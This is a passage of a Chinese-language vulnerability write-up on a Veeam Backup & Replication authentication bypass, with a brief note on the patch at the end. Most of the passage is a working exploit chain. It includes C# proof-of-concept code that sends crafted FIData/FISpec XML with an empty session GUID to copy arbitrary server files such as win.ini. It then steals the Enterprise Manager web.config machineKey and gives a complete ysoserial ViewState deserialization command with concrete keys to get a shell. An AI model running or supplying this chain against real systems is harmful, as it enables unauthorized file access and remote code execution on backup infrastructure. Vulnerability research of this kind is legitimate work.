            {
                throw new Exception(string.Concat(new string[]
                {
                    "Fatal logic error: Failed to upload file '",
                    spec.FileProxyPath,
                    "' to host ",
                    host,
                    ": Unexpected target host type"
                }));
            }
            value = CEpAgentConfigurationServiceExecuter.UploadLinuxPackage(spec);
        }
        response.SetString("RemotePath", value);
    }
分别有三个UploadWindowsFix、UploadWindowsPackage、UploadLinuxPackage函数，跟到UploadWindowsPackage中看到UploadFile函数
在UploadFile函数中将localPath读取然后写入到remotePath中。
如果把远程主机赋值为127.0.0.1，我们就可以在目标机器上任意复制文件。
## 构造payload
在整个调用过程中，我遇到了多个问题，下面分步骤讲解
  1. CForeignInvokerParams.GetContext(text);
  2. GetOrCreateExecuter
  3. Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CSpecDeserializationContext, CConnectionState)
在上文分析中我们知道，需要让程序的Executer设置为CInvokerServerSyncExecuter实例。而在GetOrCreateExecuter取Executer实例时是根据CForeignInvokerParams.GetContext(text)的值来决定的。上文追溯到了这里CSpecDeserializationContext的构造函数
几个必填字段
  1. FIData
  2. FISpec
  3. FISessionId
    CInputXmlData FIData = new CInputXmlData("FIData");
    CInputXmlData FISpec = new CInputXmlData("FISpec");
    FISpec.SetGuid("FISessionId", Guid.Empty);
    FIData.InjectChild(FISpec);
将FISessionId赋值为Guid.Empty即可拿到CInvokerServerSyncExecuter
接着来看还需要什么，在
`Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CSpecDeserializationContext,
CConnectionState)` 中
    public string Execute(CSpecDeserializationContext context, CConnectionState state)
    {
        return this.Execute(context.GetSpec(new CCommonForeignDeserializationContextProvider()), state.FindCertificateThumbprint(), state.RemoteEndPoint.ToString());
    }
context.GetSpec()函数是重要点。
他将传入的`this._specData`也就是我们构造的xml数据进行解析，跟进去看看
    public static CForeignInvokerSpec Unserial(COutputXmlData datas, IForeignDeserializationContextProvider provider)
    {
        EForeignInvokerScope scope = CForeignInvokerSpec.GetScope(datas);
        CForeignInvokerSpec cforeignInvokerSpec;
        if (scope ("DefaultProtocol", ESSHProtocol.Rebex);
            FISpec.SetString("FileRelativePath", "FileRelativePath");
            FISpec.SetString("FileRemotePath", @"C:\windows\test.txt");
            FISpec.SetString("FileProxyPath", @"C:\windows\win.ini");
            FIData.InjectChild(FISpec);
            Console.WriteLine(FIData.Root.OuterXml);
            new BinaryWriter(authStream).WriteCompressedString(FIData.Root.OuterXml, Encoding.UTF8);
            string response = new BinaryReader(authStream).ReadCompressedString(int.MaxValue, Encoding.UTF8);
            Console.WriteLine("response:");
            Console.WriteLine(response);
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }
        finally
        {
            authStream.Close();
        }
        Console.ReadKey();
    }
成功复制文件。
## getshell
目前只是能复制服务器上已有的文件，文件名可控，但是文件内容不可控。如何getshell？
看了看安装完成之后的Veeam有几个web
在`C:\Program Files\Veeam\Backup and Replication\Enterprise
Manager\WebApp\web.config`中有machineKey，然后就是懂得都懂了，把web.config复制一份写入到1.txt中，然后通过web访问拿到machineKey
最后ViewState反序列化就行了。
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc" --validationkey="0223A772097526F6017B1C350EE18B58009AF1DCF4C8D54969FEFF9721DF6940948B05A192FA6E64C74A9D7FDD7457BB9A59AF55D1D84771A1E9338C4C5E531D" --decryptionalg="AES"  --validationalg="HMACSHA256" --decryptionalg="AES" --decryptionkey="0290D18D19402AE3BA93191364A5619EF46FA7E42173BB8C" --minfy --path="/error.aspx"
# 修复
对比补丁，上传的地方加了文件名校验
授权的地方用的CInvokerAdminNegotiateAuthenticator
不仅判断了是不是授权用户，而且判断了是否是管理员
# 总结
这个漏洞给我的感觉学到了很多东西，像tcp编程，Windows鉴权机制在csharp中的应用，以及在大型应用文件传输的一些漏洞点。
另外最后一点通过复制文件拿到web.config是我自己想出来的思路，不知道漏洞发现者Nikita Petrov是否和我的做法一致，或者还有其他的利用方式。
漏洞修复了鉴权，但是感觉授权之后仍然可能会存在一些其他的漏洞，毕竟CInvokerServerSyncExecuter仍然有很多的Service可以走，而不仅仅是CEpAgentConfigurationServiceExecuter。
分析这个洞我并不是全部正向看的，更多取决于补丁diff，但是这种大型软件的开发架构让我自己感觉学到了很多。